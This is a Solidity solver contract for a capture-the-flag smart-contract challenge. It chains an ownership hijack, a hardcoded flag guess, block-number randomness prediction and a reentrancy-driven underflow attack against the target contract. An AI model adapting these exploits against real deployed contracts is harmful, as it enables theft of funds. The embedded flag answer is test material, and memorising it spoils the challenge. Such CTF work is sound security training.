// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

/**
 * @dev Minimal interface to the vulnerable challenge contract.
 *      Only the functions we actually call are declared here.
 */
interface ISecunaCTF {
    /* ─── Admin ─────────────────────────────────────── */
    function transferOwnership(address newOwner) external;

    /* ─── tracing ─────────────────────────────────────── */
    function guessHiddenMessage(string calldata _guess) external;

    /* ─── Insecure randomness ─────────────────────────────────── */
    function guessNumber(uint256 _guess) external;

    /* ─── Re-entrancy / underflow section ─────────────────────── */
    function damageEnemy() external payable;
}

/**
 * @title  SecunaCTFSolver
 * @notice Performs, in order:
 *         1. Ownership hijack
 *         2. Hidden-message guess
 *         3. Block-number guess
 *         4. Transfer ownership back to user then manually deposit (send) funds to the CTF contract
 *         5. Re-claim ownership back to this contract (SecunaCTFSolver)
 *         6. Re-entrant underflow to push `EnemyHealth` above 10
 */
contract SecunaCTFSolver {
    ISecunaCTF public immutable target;
    uint8 private reentryCount;               // tracks #re-entrant hits

    /* ──────────────────────────────────────────────────────────── */
    /* Constructor                                                  */
    /* ──────────────────────────────────────────────────────────── */
    constructor(ISecunaCTF _target) {
        target = _target;
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 1: seize ownership                                      */
    /* ──────────────────────────────────────────────────────────── */
    function pwn1() external {
        target.transferOwnership(address(this));
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 2: pwn hidden message                                   */
    /* ──────────────────────────────────────────────────────────── */
    function pwn2() external {
        /* Step 2: reveal the hidden message (Blockchain Tracing) */
        target.guessHiddenMessage(
            "SECUNA{h3ll0_th3r3_s0_y0u_g0t_my_msg!}"
        );
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 3: pwn random number                                    */
    /* ──────────────────────────────────────────────────────────── */
    function pwn3() external {
        /* Step 3: predict the “random” number – it is the current block */
        target.guessNumber(block.number);
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 4: return the ownership to the user                     */
    /*         then MANUALLY fund the contract                      */
    /* ──────────────────────────────────────────────────────────── */
    function pwn4() external {
        target.transferOwnership(address(msg.sender));
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 5: reclaim the ownership to this contract               */
    /* ──────────────────────────────────────────────────────────── */
    function pwn5() external {
        target.transferOwnership(address(this));
    }

    /* ──────────────────────────────────────────────────────────── */
    /* step 6: start the first call to damageEnemy                  */
    /*         and let the chain of reentrancy triggers             */
    /* ──────────────────────────────────────────────────────────── */
    function pwn6() external {
        /* First hit – further 19 hits will occur inside `receive()` */
        target.damageEnemy();
    }

    /* ──────────────────────────────────────────────────────────── */
    /* Re-entrancy hook (reward is only 1 wei each time)            */
    /* ──────────────────────────────────────────────────────────── */
    receive() external payable {
        /* Re-enter only when the target pays the 1 wei reward      */
        if (
            msg.sender == address(target) &&
            msg.value == 1 wei &&
            reentryCount < 19        /* 1 outer + 19 inner = 20 hits */
        ) {
            reentryCount += 1;
            target.damageEnemy();    // recursive strike
        }
    }
}
